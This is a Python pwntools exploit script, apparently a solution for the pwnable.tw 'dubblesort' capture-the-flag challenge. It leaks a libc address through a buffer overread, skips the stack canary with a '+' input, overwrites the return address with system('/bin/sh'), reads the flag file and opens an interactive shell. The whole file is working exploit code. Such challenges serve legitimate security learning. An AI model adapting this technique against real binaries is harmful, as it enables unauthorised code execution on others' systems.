from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = 'dubblesort'
e = ELF(file)
libc = e.libc
libc = ELF('./libc_32.so.6')
ip = 'chall.pwnable.tw'
port = '10101'
local = 0


def dbg(code=""):
    if local == 0:
        return
    gdb.attach(p, code)


local_offset = 1777664
remote_offset = 1769472


def run():
    global p
    global offset
    if local == 1:
        p = process(file)
        offset = local_offset
    else:
        p = remote(ip, port)
        offset = remote_offset


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run()
# leak libc

rc()
se('a' * (0x4 * 6 + 1))
ru('a' * (0x4 * 6 + 1))
libc_base = un32('\x00' + rn(3)) - offset
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh'))
print hex(libc_base)
sl('35')
for i in range(24):
    ru('number :')
    sl(str(i + 1))
ru('number :')
sl('+')
for i in range(8):
    ru('number :')
    sl(str(system))
ru('number :')
dbg('breakrva 0xb17')
sl(str(system))
ru('number :')
sl(str(binsh))

sl('cat /home/dubblesort/flag')
rc()
shell()